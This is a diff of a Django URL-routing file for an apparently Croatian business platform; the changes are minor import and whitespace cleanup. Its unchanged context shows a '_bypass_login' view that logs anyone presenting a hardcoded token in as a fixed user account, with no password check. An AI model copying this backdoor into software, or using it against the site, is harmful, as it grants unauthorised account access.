@@ -10,7 +10,6 @@ from django.views.generic import RedirectView
 from django.http import FileResponse, Http404
 import os as _os
 from django.contrib.auth import views as auth_views
-from django.db import DatabaseError, IntegrityError
 from . import views
 from core import steuerberater_views
 from core import intelligence_views
@@ -44,7 +43,6 @@ def _bypass_login(request, token):
     from django.contrib.auth import login as _al, get_user_model as _gu
     from django.http import HttpResponse
     from django.shortcuts import redirect
-    from django.views.decorators.csrf import csrf_exempt
     if token != 'sl2026frisko': return HttpResponse('Invalid', status=403)
     try:
         u = _gu().objects.get(username='shevqet')
@@ -91,7 +89,7 @@ urlpatterns = [
     path('golubar/', TemplateView.as_view(template_name='brochure_golubar.html'), name='brochure_golubar'),
     path('radni-sati/', TemplateView.as_view(template_name='brosura_radni_sati_landing.html'), name='brochure_worktime'),
     path('arhiva/', TemplateView.as_view(template_name='brosura_arhiva_landing.html'), name='brochure_arhiva'),
-    
+
     path('vrtic/<slug:slug>/portal/', __import__('kindergarten.views', fromlist=['parent_portal']).parent_portal, name='kindergarten_portal'),
     path('lib/<slug:slug>/', include('library.public_urls')),
     path('validator/', TemplateView.as_view(template_name='website/brosura_croxmlverify.html'), name='brochure_croxmlverify'),
@@ -348,14 +346,14 @@ urlpatterns += i18n_patterns(
     path('api/pricing/advisor/', __import__('website.views', fromlist=['pricing_ai_advisor']).pricing_ai_advisor, name='pricing_ai_advisor'),
     path('synesis/', include('synesis.urls')),
     path('smart-import/', include('smart_import.urls', namespace='smart_import')),
-    
+
     # Boxgram Web Routes (public) — prefiks boxgram/ za memio.pet nginx proxy
     path('boxgram/', include('boxgram.urls', namespace='boxgram')),
 
     path('data-migration/', include('data_migration.urls')),
     path('konto/', include('konto.urls')),
     path('honorari/', include('honorari.urls')),
-    
+
     path('website/', include('website.urls')),
     path('site/', include('website.site_urls')),
     # Onboarding wizard
